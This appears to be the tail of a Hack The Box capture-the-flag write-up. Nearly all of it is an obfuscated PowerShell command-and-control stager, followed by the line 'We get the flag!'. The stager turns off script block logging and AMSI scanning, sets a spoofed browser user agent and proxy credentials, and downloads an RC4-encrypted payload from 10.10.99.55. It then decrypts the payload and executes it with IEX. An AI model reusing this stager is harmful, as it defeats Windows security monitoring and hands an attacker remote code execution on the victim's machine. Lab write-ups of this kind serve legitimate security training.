$GroUPPOLiCYSEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GETValUe($nulL);$GRouPPOlICySeTTiNgS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;$GRouPPOLICYSEtTingS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};[SysTem.NeT.SErVIcePOIntMAnAgER]::ExpEct100COnTinuE=0;$WC=NEW-OBjEcT SysTEM.NEt.WeBClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDerS.Add('User-Agent',$u);$Wc.PRoXy=[SysTeM.NET.WebRequEst]::DefaULtWeBPROXY;$wC.PRoXY.CREDeNtIaLS = [SYSTeM.NET.CreDEnTiaLCaChe]::DeFauLTNEtwOrkCredentiAlS;$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");$ser='http://10.10.99.55:80';$t='/login/process.php';$flag='HTB{$_j0G_********0rY_$}';$DatA=$WC.DoWNLoaDDATA($SeR+$t);$iv=$daTA[0..3];$DAta=$DaTa[4..$DAta.LenGTH];-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX
```

We get the flag!

---
